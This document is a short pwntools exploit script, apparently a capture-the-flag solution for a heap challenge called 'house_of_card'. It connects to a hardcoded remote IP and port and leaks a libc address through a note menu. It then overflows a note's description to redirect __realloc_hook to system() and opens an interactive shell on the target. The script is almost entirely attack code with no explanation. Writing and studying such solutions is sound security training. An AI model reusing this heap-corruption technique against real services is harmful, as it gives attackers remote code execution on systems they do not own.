from pwn import *

HOST, PORT = "178.128.87.12", "31336"
# HOST, PORT = "192.168.137.139", 31337
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("Quit")
c1 = lambda: r.recvuntil(':')
c2 = lambda: r.recvuntil('?')
heap = None
def c3(save=False):
	global heap
	data = r.recvuntil('\n>')
	if save:
		data = data.split('Description :\n')[-1][2:]
		print hexdump(data)
		data = data[8:16]
		heap = u64(data)
		print hex(heap)
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[1]

def new_note(name, desclen, desc):
	go(1)
	c1()
	ii(name)
	c2()
	ii(desclen)
	c1()
	ii(desc)

def edit_note(index, name, desclen, desc):
	go(2)
	c3()
	ii(index)
	c2()
	ii(name)
	c2()
	ii(desclen)
	r.send(desc)

def del_note(index, save=False):
	go(3)
	c3(save)
	ii(index)

# pause()
orig = 0x84 - 1
new = orig + 1
new_note('a', orig, 'a')
new_note('a', orig, 'a')
new_note('a', orig, 'a')
del_note(3, True)
libc = ELF('backups/house_of_card_75b74515161bed0d424f0541184ce933/libc.so.6')
libc.address = heap - 0x3c1b00 & ~0xfff
print hex(libc.address)
for i in range(3):
	new_note('a', orig, 'a')
edit_note(1, 'a', new, 'a' * (orig + 1) + p64(0x21) + p64(libc.symbols['__realloc_hook'] - 3) + '\n')
edit_note(5, 'sh\x00' + p64(libc.symbols['system']), 128, 'a\n')

r.interactive()
